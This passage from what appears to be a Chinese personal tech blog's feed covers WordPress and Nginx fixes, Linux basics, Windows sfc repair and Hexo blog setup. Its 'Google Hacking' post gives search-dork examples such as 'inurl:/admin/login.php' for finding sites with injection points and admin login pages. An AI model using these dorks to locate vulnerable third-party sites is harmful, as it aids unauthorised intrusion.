id="wordpress设置"><a href="#wordpress设置" class="headerlink" title="wordpress设置"></a>wordpress设置</h1><h2 id="使用的插件"><a href="#使用的插件" class="headerlink" title="使用的插件"></a>使用的插件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Markdown Editor <span class="comment">#支持Markdown语法</span></span><br><span class="line">Restricted Site Access <span class="comment">#访问控制，必须先登陆</span></span><br><span class="line">BackWPup <span class="comment">#备份</span></span><br><span class="line">WP User Avatar <span class="comment">#自定义头像，在个人资料中修改</span></span><br></pre></td></tr></table></figure><p><br></p><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><h2 id="修改链接后访问文章404问题"><a href="#修改链接后访问文章404问题" class="headerlink" title="修改链接后访问文章404问题"></a>修改链接后访问文章404问题</h2><p>问题描述<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/3.png" alt="" title="" class="">                <p></p>            </figure><br><br><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/4.png" alt="" title="" class="">                <p></p>            </figure><br>解决办法<br>修改Nginx的配置文件中的server配置<br>文件绝对路径： /etc/nginx/sites-available/default<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/5.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php;</span><br></pre></td></tr></table></figure></p><p>重启服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="文件上传限制"><a href="#文件上传限制" class="headerlink" title="文件上传限制"></a>文件上传限制</h2><p>问题描述<br>图片文件过大无法上传<br>解决办法<br>修改nginx配置文件中的server配置<br>文件绝对路径： /etc/nginx/sites-available/default<br>在server中添加：client_max_body_size   20m;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">client_max_body_size   20m;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重启服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="裁剪图片时发生错误"><a href="#裁剪图片时发生错误" class="headerlink" title="裁剪图片时发生错误"></a>裁剪图片时发生错误</h2><p>问题描述<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/6.png" alt="" title="" class="">                <p></p>            </figure><br>解决办法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get  install php-gd</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="远程下终端无法tap补全命令"><a href="#远程下终端无法tap补全命令" class="headerlink" title="远程下终端无法tap补全命令"></a>远程下终端无法tap补全命令</h2><p>在远程桌面中设置，打开菜单-&gt;设置-&gt;窗口管理器，或者在终端中输入xfwm4-settings打开（xfwm4就是xfce4 window manger的缩写）<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/7.png" alt="" title="" class="">                <p></p>            </figure><br>选择键盘，可以看到窗口快捷键中动作一列有“切换同一应用程序的窗口”选项，将该选项的快捷键清除后关闭窗口即可<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog-group/8.png" alt="" title="" class="">                <p></p>            </figure></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux常用命令</title>
      <link href="/2018/03/27/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/03/27/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Linux的一些基础命令和一些技巧</p></blockquote><a id="more"></a><h1 id="常用基础命令"><a href="#常用基础命令" class="headerlink" title="常用基础命令"></a>常用基础命令</h1><blockquote><p>ls　用来显示目标列表<br>cd　[path]　用来切换工作目录<br>pwd　以绝对路径的方式显示用户当前工作目录<br>man　[command]　查看Linux中的指令帮助、配置文件帮助和编程帮助等信息<br>apropos　[whatever]　在一些特定的包含系统命令的简短描述的数据库文件里查找关键字<br>echo　[string]　打印一行文本，参数“-e”可激活转义字符<br>cat　[file]　连接文件并打印到标准输出设备上<br>less　[file]　允许用户向前或向后浏览文字档案的内容<br>mv　[file1]　[file2]　用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中<br>cp　[file1]　[file2]　用来将一个或多个源文件或者目录复制到指定的目的文件或目录<br>rm　[file]　可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉<br>ps　用于报告当前系统的进程状态<br>top　实时查看系统的整体运行情况<br>kill　杀死一个进程<br>ifconfig　查看或设置网络设备<br>ping　查看网络上的主机是否工作<br>netstat　显示网络连接、路由表和网络接口信息<br>nc(netcat)　建立TCP和UDP连接并监听<br>su　切换当前用户身份到其他用户身份<br>touch　[file]　创建新的空文件<br>mkdir　[dir]　创建目录<br>chmod　变更文件或目录的权限<br>chown　变更某个文件或目录的所有者和所属组<br>nano/vim/emacs　字符终端的文本编辑器<br>exit　退出shell<br>管道命令符　‘|’　将一个命令的标准输出作为另一个命令的标准输入</p></blockquote><h1 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h1><blockquote><p>Up(Down)　上（下）一条指令<br>Ctrl + c　终止当前进程<br>Ctrl + z　挂起当前进程，使用“fg”可唤醒<br>  fg [工作号]　将进程放到前台运行<br>  bg [工作号]　将进程放到后台运行<br>Ctrl + d　删除光标处的字符<br>Ctrl + l　清屏<br>Ctrl + a　移动到命令行首<br>Ctrl + e　移动到命令行尾<br>Ctrl + b　按单词后移（向左）<br>Ctrl + f　按单词前移（向右）<br>Ctrl + Shift + c　复制<br>Ctrl + Shift + v　粘贴</p></blockquote><h1 id="根目录结构"><a href="#根目录结构" class="headerlink" title="根目录结构"></a>根目录结构</h1><blockquote><p>/bin  、 /sbin  ：链接到  /usr/bin  ，存放 Linux 一些核心的二进制文件，其包含的命令可在 shell 上运行。<br>/boot  ：操作系统启动时要用到的程序。<br>/dev  ：包含了所有 Linux 系统中使用的外部设备。需要注意的是这里并不是存放外部设备的驱动程序，而是一个访问这些设备的端口。<br>/etc  ：存放系统管理时要用到的各种配置文件和子目录。<br>/etc/rc.d  ：存放 Linux 启动和关闭时要用到的脚本。<br>/home  ：普通用户的主目录。<br>/lib  、 /lib64  ：链接到  /usr/lib  ，存放系统及软件需要的动态链接共享库。<br>/mnt  ：这个目录让用户可以临时挂载其他的文件系统。<br>/proc  ：虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。<br>/root  ：系统管理员的主目录。<br>/srv  ：存放一些服务启动之后需要提取的数据。<br>/sys  ：该目录下安装了一个文件系统 sysfs。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建时，对应的文件和目录也在内核对象子系统中被创建。<br>/tmp  ：公用的临时文件存放目录。<br>/usr  ：应用程序和文件几乎都在这个目录下。<br>/usr/src  ：内核源代码的存放目录。<br>/var  ：存放了很多服务的日志信息。</p></blockquote><h1 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h1><p>目前计算机中采用两种字节存储机制：大端（Big-endian）和小端（Little-<br>endian）。<br>小端口诀: 高高低低 -&gt; 高字节在高地址, 低字节在低地址<br>大端口诀: 高低低高 -&gt; 高字节在低地址, 低字节在高地址</p><h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><p>使用命令的输出作为可执行文件的输入参数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./vulnerable <span class="string">'your_command_here'</span></span><br><span class="line">$ ./vulnerable $(your_command_here)</span><br></pre></td></tr></table></figure></p><p>使用命令作为输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ your_command_here | ./vulnerable</span><br></pre></td></tr></table></figure></p><p>将命令行输出写入文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ your_command_here &gt; filename</span><br></pre></td></tr></table></figure></p><p>使用文件作为输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./vulnerable &lt; filename</span><br></pre></td></tr></table></figure></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> System </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sfc命令</title>
      <link href="/2018/03/22/sfc%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/03/22/sfc%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>今天浏览博客的时候被人植入了广告</p></blockquote><a id="more"></a><p>忘记截图保存了，不过广告的图片外链地址还在记录里，广告被放在了我博客的右边<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/sfc/anlian.png" alt="" title="" class="">                <p></p>            </figure><br>但是我的博客是静态的怎么会被植入广告，开始我是用Chrome访问的，然后我换成了360和Firefox访问的时候也都有。<br>最后我在别人的电脑浏览了我的博客，发现广告终于没有了。<br>想来应该是我电脑的问题，然后就用360杀一下呗<br>结果病毒没杀出来，把我的工具杀出来了<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/sfc/gongju.png" alt="" title="" class="">                <p></p>            </figure><br>好吧，三个浏览器都被改了，想想应该是系统被修改了，那就修复下系统吧<br>那么Windows下就可以使用sfc这个命令<br>这个命令必须是管理员才能执行的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\zxw&gt; sfc</span><br><span class="line"></span><br><span class="line">为了使用 sfc 工具，你必须作为管理员运行控制台会话。</span><br><span class="line">PS C:\Users\zxw&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; sfc /?</span><br><span class="line"></span><br><span class="line">Microsoft (R) Windows (R) Resource Checker 6.0 版</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">扫描所有保护的系统文件的完整性，并使用正确的 Microsoft 版本替换</span><br><span class="line">不正确的版本。</span><br><span class="line"></span><br><span class="line">SFC [/SCANNOW] [/VERIFYONLY] [/SCANFILE=&lt;file&gt;] [/VERIFYFILE=&lt;file&gt;]</span><br><span class="line">    [/OFFWINDIR=&lt;offline windows directory&gt; /OFFBOOTDIR=&lt;offline boot directory&gt;]</span><br><span class="line"></span><br><span class="line">/SCANNOW        扫描所有保护的系统文件的完整性，并尽可能修复</span><br><span class="line">                有问题的文件。</span><br><span class="line">/VERIFYONLY     扫描所有保护的系统文件的完整性。不会执行修复</span><br><span class="line">                操作。</span><br><span class="line">/SCANFILE       扫描引用的文件的完整性，如果找到问题，则修复文件。</span><br><span class="line">                指定完整路径 &lt;file&gt;</span><br><span class="line">/VERIFYFILE     验证带有完整路径 &lt;file&gt; 的文件的完整性。</span><br><span class="line">                不会执行修复操作。</span><br><span class="line">/OFFBOOTDIR     对于脱机修复，指定脱机启动目录的位置</span><br><span class="line">/OFFWINDIR      对于脱机修复，指定脱机 Windows 目录的位置</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">        sfc /SCANNOW</span><br><span class="line">        sfc /VERIFYFILE=c:\windows\system32\kernel32.dll</span><br><span class="line">        sfc /SCANFILE=d:\windows\system32\kernel32.dll /OFFBOOTDIR=d:\ /OFFWINDIR=d:\windows</span><br><span class="line">        sfc /VERIFYONLY</span><br><span class="line">PS C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure><p>使用sfc /SCANNOW后广告就消失了</p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> System </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 系统命令 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Google Hacking</title>
      <link href="/2018/03/22/GoogleHacking/"/>
      <url>/2018/03/22/GoogleHacking/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>你会用Google嘛？</p></blockquote><a id="more"></a><p>先看图，这图是从知乎上拿下来的<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/GoogleHacking/GoogleHacking.jpg" alt="" title="" class="">                <p></p>            </figure></p><h1 id="基本符号"><a href="#基本符号" class="headerlink" title="基本符号"></a>基本符号</h1><blockquote><p>-keyword #强制结果不要出现此关键字<br>*keyword* #模糊搜索，强制结果包含此关键字<br>“keyword” #强制搜索结果出现此关键字</p></blockquote><h1 id="高级操作符"><a href="#高级操作符" class="headerlink" title="高级操作符"></a>高级操作符</h1><blockquote><p>site:<br>搜索指定的网页内容,可以用来搜索子域名、跟此域名相关的内容,例如：site:zhihu.com</p><p>filetype:<br>搜索指定文件类型,例如：”web安全” filetype:pdf,搜索跟安全书籍相关的pdf文件</p><p>ext:<br>与filetype等价</p><p>inurl:<br>搜索url网址存在特定关键字的网页,可以用来搜寻有注入点的网站,例如：inurl:/admin/login.php,搜索网址中有”/admin/login.php”网页</p><p>intitle:<br>搜索标题存在特定关键字的网页,例如：intitle:后台登陆,搜索网页标题是“后台登陆”的网页</p><p>allinurl:<br>类似inurl:,但是可指定多个字符，不能与其他操作符混合使用，可单独使用</p><p>link:<br>搜索链接到所输入URL的页面，该操作符不需要关键字，不能与其他操作符及关键字混用</p><p>allintitle:<br>和intitle类似，能接多个关键字，但是不能与其他操作符混合使用，可单独使用</p><p>intext:<br>搜索正文存在特定关键字的网页,例如：intext:知乎</p><p>allintext:<br>使用方法和intext类似，能接多个关键字，能与其他操作符混合使用，可单独使用</p><p>cache:<br>输入URL，搜索特定页面的缓存快照，即使目标页面发生变动甚至不存在了，依然可以看到它的副本</p><p>define:<br>搜索输入关键词或关键词组的定义来源链接,例如搜索:define:script,将返回关于script的定义，该操作符不能与其他操作符及关键字混用。</p></blockquote><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>操作符之间要有空格<br>引号为英文的双引号</p><h1 id="搭配使用"><a href="#搭配使用" class="headerlink" title="搭配使用"></a>搭配使用</h1><p>在freebuf中搜索关于”黑客”的PDF文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;黑客&quot; site:freebuf.com filetype:pdf</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/GoogleHacking/heike.png" alt="" title="" class="">                <p></p>            </figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>博客搭建笔记</title>
      <link href="/2018/03/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/03/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>梳理下blog搭建所涉及的知识，框架：Node.js+Git+Hexo+Makrdown</p></blockquote><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的博客是基于node.js+git+Hexo+Markdown搭建的，代码托管在Github，域名从阿里云买的，映射到Github的IP。</p><h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>在 Windows 环境下安装 Node.js 非常简单，仅须到<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">官网下载</a>安装文件并执行即可完成安装。安装无脑下一步即可。</p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>Git教程：<a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">传送门</a><br>下载链接：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a><br>安装完成后鼠标右键菜单多了两个选项<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/git.png" alt="右键菜单栏" title="" class="">                <p>右键菜单栏</p>            </figure></p><h3 id="Git基本操作"><a href="#Git基本操作" class="headerlink" title="Git基本操作"></a>Git基本操作</h3><p>用于blog备份，现在已经不需要了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建一个仓库</span></span><br><span class="line">git init</span><br><span class="line"><span class="comment"># 配置仓库</span></span><br><span class="line">git config</span><br><span class="line">git config --global user.name <span class="string">"Your Name"</span></span><br><span class="line">git config --global user.email <span class="string">"email@example.com"</span></span><br><span class="line"><span class="comment"># 将远程仓库复制到本地</span></span><br><span class="line">git <span class="built_in">clone</span> 项目地址</span><br><span class="line"><span class="comment"># 抓取远程仓库所有分支更新并合并到本地</span></span><br><span class="line">git pull</span><br><span class="line"><span class="comment"># 将文件放到暂存区</span></span><br><span class="line">git add 文件名/文件夹名</span><br><span class="line">git add . 或者 git add --all <span class="comment"># 全部内容</span></span><br><span class="line"><span class="comment"># 提交你的修改</span></span><br><span class="line">git commit -m <span class="string">"注释"</span></span><br><span class="line"><span class="comment"># 远程仓库操作：增加/删除</span></span><br><span class="line">git remote add 仓库名称 仓库地址</span><br><span class="line">git remote rm 仓库名称</span><br><span class="line"><span class="comment"># 推送本地仓库更新到远程仓库</span></span><br><span class="line">git push -u 远程名 本地分支</span><br><span class="line"><span class="comment"># 合并分支</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></p><h4 id="Git提交远程库流程"><a href="#Git提交远程库流程" class="headerlink" title="Git提交远程库流程"></a>Git提交远程库流程</h4><p>将文件放入暂存区-&gt;提交修改-&gt;将本地更新推送到远程仓库</p><h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>常用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g <span class="comment"># 全局安装hexo全家桶</span></span><br><span class="line">npm install <span class="comment"># 安装基础依赖</span></span><br><span class="line">hexo init blog <span class="comment"># 初始化配置</span></span><br><span class="line">hexo generate <span class="comment"># 生成本地静态文件,作用不大，本地查看不需要生成public文件夹；部署时直接hexo d默认先生成public(public文件夹不存在时)</span></span><br><span class="line">hexo server <span class="comment"># 查看本地效果,开启服务，地址：localhost:4000</span></span><br><span class="line">hexo deploy <span class="comment"># 远程部署,推送内容</span></span><br><span class="line">hexo new 文章名 <span class="comment"># 创建新文章</span></span><br></pre></td></tr></table></figure></p><h3 id="安装部署插件"><a href="#安装部署插件" class="headerlink" title="安装部署插件"></a>安装部署插件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h4 id="旧的部署配置"><a href="#旧的部署配置" class="headerlink" title="旧的部署配置"></a>旧的部署配置</h4><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  - <span class="keyword">type</span>: git</span><br><span class="line">    repo: git@git.coding.net:YuanLiChenAi/仓库名.git </span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure><p>这是我参考的完整教程的博客 <a href="https://my.oschina.net/ryaneLee/blog/638440" target="_blank" rel="noopener">https://my.oschina.net/ryaneLee/blog/638440</a></p><h4 id="新的部署配置"><a href="#新的部署配置" class="headerlink" title="新的部署配置"></a>新的部署配置</h4><p>配置代码比原方式多一个分支，可以将源文件备份在分支中。<br>以如下代码为例，需要提前在仓库创建分支，并把src分支设置为默认分支，不然<code>git clone</code>的内容是master的内容，也就是<code>hexo g</code>生成的public。<br><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  - <span class="keyword">type</span>: git</span><br><span class="line">    repo: git@git.coding.net:YuanLiChenAi/仓库名.git </span><br><span class="line">    branch: master</span><br><span class="line">  - <span class="keyword">type</span>: git</span><br><span class="line">    repo: git@git.coding.net:YuanLiChenAi/仓库名.git </span><br><span class="line">    branch: src</span><br><span class="line">    extend_dirs: /</span><br><span class="line">    ignore_hidden: <span class="built_in">false</span></span><br><span class="line">    ignore_pattern:</span><br><span class="line">        public: .</span><br><span class="line">        .git: .</span><br></pre></td></tr></table></figure></p><p>具体的部署流程：<a href="/2018/07/06/Web/blog-coding/">记一次部署迁移</a><br>完整的配置流程：<a href="http://blog.lujingtao.com/2017/11/07/hexo-new/" target="_blank" rel="noopener">玩转hexo - 1 - 蠢萌的序</a>、<a href="http://blog.lujingtao.com/2017/11/07/hexo-init/" target="_blank" rel="noopener">玩转hexo - 2 - 起步</a>、<a href="http://blog.lujingtao.com/2017/11/19/hexo-deploy/" target="_blank" rel="noopener">玩转hexo - 3 - 部署</a>、<a href="http://blog.lujingtao.com/2017/11/20/hexo-theme/" target="_blank" rel="noopener">玩转hexo - 4 - 主题</a>.</p><blockquote><ul><li><code>git clone</code>后需要将<code>.git</code>文件夹删除， </li><li>安装hexo插件<code>npm install hexo --save</code></li><li>第一次部署时会生成<code>.deploy_git</code>文件夹，在下次部署时需要删除该文件夹，不然会部署失败</li></ul><footer><strong>注意事项</strong></footer></blockquote><h1 id="Makrdown编写"><a href="#Makrdown编写" class="headerlink" title="Makrdown编写"></a>Makrdown编写</h1><p>Markdown语法：<a href="http://xianbai.me/learn-md/article/about/readme.html" target="_blank" rel="noopener">http://xianbai.me/learn-md/article/about/readme.html</a></p><h2 id="Atom"><a href="#Atom" class="headerlink" title="Atom"></a><del>Atom</del></h2><p>问题太多，已经不用了，看下面的<a href="/2018/03/20/blog/#VScode">VScode</a></p><h3 id="安装Atom"><a href="#安装Atom" class="headerlink" title="安装Atom"></a><del>安装Atom</del></h3><p>下载安装Atom：<a href="https://atom.io/" target="_blank" rel="noopener">https://atom.io/</a></p><h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a><del>插件安装</del></h3><blockquote><p>markdown-preview-plus #增强预览，需要关闭自带的markdown-preview，与markdown-preview-enhanced冲突，已停用<br>atom-simplified-chinese-menu #中文包<br>language-markdown #代码高亮<br>markdown-preview-enhanced #可视化+同时滚动<br>markdown-table-editor #表格<br>markdown-image-paste #贴图，记得把_config.yml中的post_asset_folder设置为true，new文章会自动创建一个文件夹<br>markdown-themeable-pdf #pdf导出<br>pdf-view #pdf 查看</p></blockquote><h2 id="VScode"><a href="#VScode" class="headerlink" title="VScode"></a>VScode</h2><h3 id="安装VScode"><a href="#安装VScode" class="headerlink" title="安装VScode"></a>安装VScode</h3><p>下载地址：<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">https://code.visualstudio.com/</a></p><h3 id="插件安装-1"><a href="#插件安装-1" class="headerlink" title="插件安装"></a>插件安装</h3><blockquote><p>Markdown Preview Enhanced #增强预览<br>Paste Image #贴图，Ctrl+Alt+V</p></blockquote><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/2018-07-03-14-29-40.png" alt="预览按钮" title="" class="">                <p>预览按钮</p>            </figure><h1 id="blog主题"><a href="#blog主题" class="headerlink" title="blog主题"></a>blog主题</h1><p>我使用的主题是mellow<br>github地址：<a href="https://github.com/codefine/hexo-theme-mellow.git" target="_blank" rel="noopener">https://github.com/codefine/hexo-theme-mellow.git</a><br>预览地址：<a href="https://blog.lujingtao.com/" target="_blank" rel="noopener">https://blog.lujingtao.com/</a></p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>所需依赖：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo-generator-search #local search搜索</span><br><span class="line">hexo-generator-topindex #文章置顶</span><br><span class="line">hexo-helper-qrcode #二维码分享</span><br><span class="line">hexo-renderer-less #less解析器</span><br></pre></td></tr></table></figure></p><p>安装命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-generator-search hexo-generator-topindex hexo-helper-qrcode hexo-renderer-less</span><br></pre></td></tr></table></figure></p><h2 id="新建分类页"><a href="#新建分类页" class="headerlink" title="新建分类页"></a>新建分类页</h2><p>开启分类、标签页等，不仅需要在主题配置文件的menu中开启，还需要用命令行进行创建，具体方法：<br>先用hexo new page categories创建分类页源文件，然后在source/categories/index.md中修改layout: categories。</p><h2 id="样式修改"><a href="#样式修改" class="headerlink" title="样式修改"></a>样式修改</h2><h3 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h3><p>路径：themes\mellow\source\css_custom\custom.less</p><h3 id="修改的-partial-less文件"><a href="#修改的-partial-less文件" class="headerlink" title="修改的_partial/less文件"></a>修改的_partial/less文件</h3><p>路径：themes\mellow\source\css_partial\<br>文章css：variable.less<br>代码css：highlight.less</p><h2 id="增加more按钮"><a href="#增加more按钮" class="headerlink" title="增加more按钮"></a>增加more按钮</h2><p>最新版本已加入该功能<br>路径：themes\mellow\layout_partial\index-item.ejs<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/more1.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;%- url_for(post.path) %&gt;"</span> <span class="attr">class</span>=<span class="string">"post-more waves-effect waves-button"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">%-</span> <span class="attr">theme.excerpt_link</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>主题的config中增加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">excerpt_link: more      